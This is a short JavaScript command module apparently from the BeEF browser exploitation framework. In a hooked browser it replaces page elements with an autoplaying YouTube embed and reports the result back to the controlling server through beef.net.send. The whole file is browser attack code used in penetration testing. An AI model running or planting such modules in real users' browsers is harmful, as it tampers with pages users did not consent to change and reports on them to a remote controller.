//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
	$j('<%= @jquery_selector %>').each(function(){
                var width = $j(this).css('width');
                var height = $j(this).css('height');
                $j(this).replaceWith('<embed src="http://www.youtube.com/v/<%= @youtube_id %>?fs=1&amp;hl=en_US&amp;autoplay=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="' + width + '" height="' + height + '">');
    });
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Replace Video Successful");
});
